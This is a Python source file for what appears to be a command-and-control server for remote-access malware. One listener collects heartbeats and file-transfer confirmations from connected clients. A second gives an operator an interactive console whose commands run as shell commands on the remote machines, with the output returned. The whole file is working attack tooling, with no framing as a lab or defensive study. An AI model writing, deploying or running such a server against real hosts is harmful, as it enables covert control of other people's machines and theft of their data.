import socket
import threading


def handle_shell(conn, addr):
    """Handle shell commands from operator on port 8020"""
    print(f"[+] Shell connected from {addr}")
    try:
        while True:
            cmd = input(f"Shell[{addr}]: ")
            if not cmd.strip():
                continue

            # Send with header 0x05
            conn.send(bytes([5]) + cmd.encode())

            if cmd.lower() in ["exit", "quit"]:
                conn.close()
                break

            # Read response
            data = conn.recv(4096)
            if not data:
                break

            header = data[0]
            payload = data[1:]

            if header == 6:  # Shell output
                print(payload.decode(errors="ignore"))
            else:
                print(f"[UNKNOWN SHELL {addr}] {payload}")

    except Exception as e:
        print(f"[-] Shell error: {e}")
    finally:
        conn.close()


def handle_heartbeat(conn, addr):
    """Handle heartbeat/data from client on port 8010"""
    print(f"[+] Heartbeat connected from {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break

            header = data[0]
            payload = data[1:]

            if header == 2:  # Heartbeat/data
                # print(f"[HEARTBEAT {addr}] {payload.decode(errors='ignore')}")
                continue
            elif header == 4:  # File confirmation
                print(f"[CONFIRMATION {addr}] {payload.decode(errors='ignore')}")
            else:
                print(f"[UNKNOWN HEARTBEAT {addr}] {payload}")

    except Exception as e:
        print(f"[-] Heartbeat error: {e}")
    finally:
        conn.close()


def start_server(port, handler, name):
    """Start a server on given port with given handler"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    print(f"[*] {name} listening on 0.0.0.0:{port}...")

    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handler, args=(conn, addr), daemon=True)
        thread.start()


if __name__ == "__main__":
    threading.Thread(target=start_server, args=(8010, handle_heartbeat, "Heartbeat"), daemon=True).start()
    threading.Thread(target=start_server, args=(8020, handle_shell, "Shell"), daemon=True).start()

    # Keep main alive
    while True:
        pass
